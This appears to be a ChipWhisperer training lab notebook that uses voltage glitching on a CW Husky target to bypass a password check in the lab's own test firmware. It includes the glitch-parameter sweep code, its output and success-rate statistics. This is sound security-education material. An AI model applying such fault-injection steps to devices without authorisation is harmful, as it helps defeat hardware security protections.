# Part 2, Topic 2: Voltage Glitching to Bypass Password

---
NOTE: This lab references some (commercial) training material on [ChipWhisperer.io](https://www.ChipWhisperer.io). You can freely execute and use the lab per the open-source license (including using it in your own courses if you distribute similarly), but you must maintain notice about this source location. Consider joining our training course to enjoy the full experience.

---

**SUMMARY:** *We've seen how voltage glitching can be used to corrupt calculations, just like clock glitching. Let's continue on and see if it can also be used to break past a password check.*

**LEARNING OUTCOMES:**

* Applying previous glitch settings to new firmware
* Checking for success and failure when glitching

## Firmware

Again, we've already covered this lab, so it'll be mostly up to you!

In [1]:
SCOPETYPE = 'OPENADC'
PLATFORM = 'CWHUSKY'
SS_VER = 'SS_VER_2_1'

In [2]:
%run "../../Setup_Scripts/Setup_Generic.ipynb"

INFO: Found ChipWhisperer😍
scope.gain.mode                          changed from low                       to high                     
scope.gain.gain                          changed from 0                         to 22                       
scope.gain.db                            changed from 15.0                      to 25.091743119266056       
scope.adc.samples                        changed from 131124                    to 5000                     
scope.clock.clkgen_freq                  changed from 0                         to 7363636.363636363        
scope.clock.adc_freq                     changed from 0                         to 29454545.454545453       
scope.clock.adc_rate                     changed from 0.0                       to 29454545.454545453       
scope.io.tio1                            changed from serial_tx                 to serial_rx                
scope.io.tio2                            changed from serial_rx                 to serial_tx         

In [3]:
%%bash -s "$PLATFORM" "$SS_VER"
cd ../../../firmware/mcu/simpleserial-glitch
make PLATFORM=$1 CRYPTO_TARGET=NONE SS_VER=$2 -j

SS_VER set to SS_VER_2_1
SS_VER set to SS_VER_2_1
arm-none-eabi-gcc (GNU Arm Embedded Toolchain 10.3-2021.10) 10.3.1 20210824 (release)
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

mkdir -p objdir-CWHUSKY 
.
Welcome to another exciting ChipWhisperer target build!!
.
.
.
.
Compiling:
.
Compiling:
Compiling:
-en     simpleserial-glitch.c ...
Compiling:
Compiling:
-en     .././hal//sam4s/startup_sam4s.c ...
-en     .././hal/hal.c ...
-en     .././hal//sam4s/sam4s_hal.c ...
-en     .././simpleserial/simpleserial.c ...
.
.
.
.
Compiling:
Compiling:
Compiling:
Compiling:
-en     .././hal//sam4s/system_sam4s.c ...
-en     .././hal//sam4s/uart.c ...
-en     .././hal//sam4s/pio.c ...
-en     .././hal//sam4s/sysclk.c ...
.
Compiling:
-en     .././hal//sam4s/pmc.c ...
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e Done!
-e 

In [4]:
fw_path = "../../../firmware/mcu/simpleserial-glitch/simpleserial-glitch-{}.hex".format(PLATFORM)
cw.program_target(scope, prog, fw_path)
if SS_VER=="SS_VER_2_1":
    target.reset_comms()

In [5]:
def reboot_flush():
    reset_target(scope)
    target.flush()
if PLATFORM == "CWLITEXMEGA":
    scope.clock.clkgen_freq = 32E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*32/7.37
    else:
        target.baud = 38400*32/7.37
elif (PLATFORM == "CWLITEARM") or ("F3" in PLATFORM):
    scope.clock.clkgen_freq = 24E6
    if SS_VER=='SS_VER_2_1':
        target.baud = 230400*24/7.37
    else:
        target.baud = 38400*24/7.37
    

In [6]:
#Do glitch loop
reboot_flush()
pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68])
target.simpleserial_write('p', pw)

val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
valid = val['valid']
if valid:
    response = val['payload']
    raw_serial = val['full_response']
    error_code = val['rv']

print(val)
print(val['payload'][0])

{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
1


Like with clock glitching, the scope object can set some typical glitch settings for you:

In [7]:
if scope._is_husky:
    scope.vglitch_setup('hp', default_setup=False) # HP alone works best for Husky
else:
    scope.vglitch_setup('both', default_setup=False) # use both transistors

In [8]:

scope.glitch.enabled = True
scope.glitch.clk_src = "pll"
scope.io.glitch_hp = True
scope.io.glitch_lp = False

scope.glitch.output = "glitch_only" # glitch_out = clk ^ glitch
scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called

scope.adc.lo_gain_errors_disabled = True
scope.adc.clip_errors_disabled = True

In [9]:
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
gc.display_stats()

IntText(value=0, description='success count:', disabled=True)

IntText(value=0, description='reset count:', disabled=True)

IntText(value=0, description='normal count:', disabled=True)

FloatSlider(value=0.0, continuous_update=False, description='width setting:', disabled=True, max=10.0, readout…

FloatSlider(value=0.0, continuous_update=False, description='offset setting:', disabled=True, max=10.0, readou…

FloatSlider(value=0.0, continuous_update=False, description='ext_offset setting:', disabled=True, max=10.0, re…

In [10]:
gc.glitch_plot(plotdots={"success":"+g", "reset":"xr", "normal":None})

Parameter name clashes for keys ['data']

:DynamicMap   []
   :Overlay
      .Points.I  :Points   [width,offset]
      .Points.II :Points   [width,offset]

In [11]:
import re
import struct

#disable logging
cw.set_all_log_levels(cw.logging.CRITICAL)

gc.set_range("width", 1800, 2800)
gc.set_range("offset", 0, 4500)
gc.set_global_step(100)

gc.set_range("ext_offset", 0, 150)
gc.set_step("ext_offset", 10) # check each clock cycle

scope.adc.timeout = 0.9

reboot_flush()

successes = 0

for glitch_settings in gc.glitch_values():
    scope.glitch.offset = glitch_settings[1]
    scope.glitch.width = glitch_settings[0]
    scope.glitch.ext_offset = glitch_settings[2]
    if scope.adc.state:
        # can detect crash here (fast) before timing out (slow)
        #print("Trigger still high!")
        gc.add("reset")
        reboot_flush()

    scope.arm()
    target.simpleserial_write('p', bytearray([0]*5))
    ret = scope.capture()
    scope.io.vglitch_reset()
    if ret:
        #print('Timeout - no trigger')
        gc.add("reset")

        #Device is slow to boot?
        reboot_flush()
    else:
        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10, timeout=50)#For loop check
        if val['valid'] is False:
            gc.add("reset")
        else:
            if val['payload'][0] == 0x01: #for loop check
                successes +=1 
                gc.add("success")
                print(val)
                print(val['payload'])
                print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
                print("🐙", end="")
            else:
                gc.add("normal")
                    
#reenable logging
cw.set_all_log_levels(cw.logging.WARNING)

{'valid': True, 'payload': CWbytearray(b'01'), 'full_response': CWbytearray(b'00 72 01 01 d4 00'), 'rv': bytearray(b'\x00')}
CWbytearray(b'01')
2000 3100 140
🐙

Let's see where we needed to target for our glitch to work:

In [12]:
gc.calc(["width", "offset"], "success_rate")

[((140,),
  {'total': 506,
   'success': 1,
   'success_rate': 0.001976284584980237,
   'reset': 114,
   'reset_rate': 0.22529644268774704,
   'normal': 391,
   'normal_rate': 0.7727272727272727}),
 ((150,),
  {'total': 506,
   'success': 0,
   'success_rate': 0.0,
   'reset': 112,
   'reset_rate': 0.22134387351778656,
   'normal': 394,
   'normal_rate': 0.7786561264822134}),
 ((130,),
  {'total': 506,
   'success': 0,
   'success_rate': 0.0,
   'reset': 97,
   'reset_rate': 0.191699604743083,
   'normal': 409,
   'normal_rate': 0.808300395256917}),
 ((120,),
  {'total': 506,
   'success': 0,
   'success_rate': 0.0,
   'reset': 101,
   'reset_rate': 0.19960474308300397,
   'normal': 405,
   'normal_rate': 0.8003952569169961}),
 ((110,),
  {'total': 506,
   'success': 0,
   'success_rate': 0.0,
   'reset': 88,
   'reset_rate': 0.17391304347826086,
   'normal': 418,
   'normal_rate': 0.8260869565217391}),
 ((100,),
  {'total': 506,
   'success': 0,
   'success_rate': 0.0,
   'reset': 82,

In [13]:
scope.dis()
target.dis()